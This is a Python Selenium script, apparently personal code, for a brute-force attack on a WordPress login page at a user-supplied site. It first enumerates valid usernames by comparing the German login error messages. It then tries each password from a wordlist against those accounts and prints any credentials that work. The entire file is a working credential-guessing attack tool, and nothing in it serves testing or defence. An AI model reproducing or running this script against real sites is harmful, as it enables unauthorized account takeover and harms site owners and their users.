from selenium import webdriver
from time import sleep

usernames = open("C:/Users/chris/AppData/Local/Programs/Python/Python37-32/Scripts/WordPress Bruteforce/WordPress Bruteforce V4/Usernames.txt", "r")
usernames = usernames.read().split(",")
valid_usernames =[]

driver = webdriver.Chrome(executable_path = r"D:\Downloads\chromedriver_win32\chromedriver.exe")
print("Enter Website for Brute Force Attack. E.g. www.[domain].tld")
website = input("Website: ")
website_input =  "http://" + website + "/wp-login"
driver.get(website_input)
    

for i in usernames:
    driver.find_element_by_id("user_login").clear()
    user_input = driver.find_element_by_id("user_login")
    user_input.send_keys(i)
    
    password_input = driver.find_element_by_id("user_pass")
    password_input.send_keys("1")
    
    login_button = driver.find_element_by_id("wp-submit")
    login_button.click()
    sleep(2)

    message = driver.find_element_by_id("login_error")
    message_content = message.get_attribute('innerHTML')
    
    
    if ("Ungültiger Benutzername" in message_content):
        i =+ 1
        continue
    elif("Das Passwort, das du für den Benutzernamen" in message_content):
        valid_usernames.append(i)
        driver.find_element_by_id("user_login").clear()
        i =+ 1
        continue
    else:
        i =+ 1
        

passwords = open("C:/Users/chris/AppData/Local/Programs/Python/Python37-32/Scripts/WordPress Bruteforce/WordPress Bruteforce V4/Passwords.txt", "r")
passwords = passwords.read().split(",")


for i in valid_usernames:

    for j in passwords:
        driver.find_element_by_id("user_login").clear()
        user_input = driver.find_element_by_id("user_login")
        user_input.send_keys(i)
        
        password_input = driver.find_element_by_id("user_pass")
        password_input.send_keys(j)

        login_button = driver.find_element_by_id("wp-submit")
        login_button.click()
        sleep(2)

        try:
            message = driver.find_element_by_id("login_error")
            j =+ 1
            continue

        except:
            print("Valid Login Information:", i,j)
            i =+ 1
            sleep(2)
            
            driver.delete_all_cookies()
            driver.get(website_input)
            sleep(2)
            
            break
            
            
    
           


